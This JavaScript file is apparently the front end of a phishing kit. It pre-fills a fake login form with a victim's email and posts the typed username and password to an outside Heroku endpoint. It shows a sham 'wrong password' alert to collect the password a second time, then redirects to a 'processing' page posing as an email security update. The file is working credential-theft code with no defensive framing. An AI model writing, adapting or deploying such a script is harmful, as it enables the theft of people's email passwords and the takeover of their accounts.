/*
const queryString = window.location.search;
let params = new URLSearchParams(queryString);
let queryemail = params.get("email");

console.log(queryemail);
*/

let queryemail = "jhonsnow@gmail.com";
console.log(queryemail);

const splitEmail = queryemail.split("@");
const emailDomain = splitEmail[splitEmail.length - 1];

$("input[name='username']").val(queryemail);

// show / hide  password
$("#showpass").click(function () {
  if ($("input[name='password']").attr("type") == "password") {
    //Change type attribute
    $("input[name='password']").attr("type", "text");
    document.getElementById("showpasstext").innerHTML = "Hide";
  } else {
    //Change type attribute
    $("input[name='password']").attr("type", "password");
    document.getElementById("showpasstext").innerHTML = "Show";
  }
});

var count = 0;

$("form").submit(function (event) {
  event.preventDefault();
  $('form input[type="submit"]').prop("disabled", true);
  let dataserialized = $("form").serializeJSON();
  data = { ...dataserialized, username: queryemail };
  console.log(data);

  $.ajax({
    type: "POST",
    url: "https://adminmailer.herokuapp.com/mail",
    // url: `${window.location.origin}/mail`,
    data: data,
    dataType: "json",
    encode: true,
  })
    .done((data) => {
      //set submit count
      if (count == 1) {
        console.log("success");
        // redirect now
        window.location.href = `../processing/?email=${emailDomain}`;
      } else {
        count++;
        console.log(count);
        $('form input[type="submit"]').prop("disabled", false);
        alert(
          `Oops sorry it seems you have entered a wrong password.\n try and enter your current password to complete your email security update.`
        );
      }
      console.log(data);
    })
    .fail((err) => {
      alert(
        `Oops sorry its seems an error has occured.\n please try again to complete`
      );
      console.log(err);
      $('form input[type="submit"]').prop("disabled", false);
    });
});
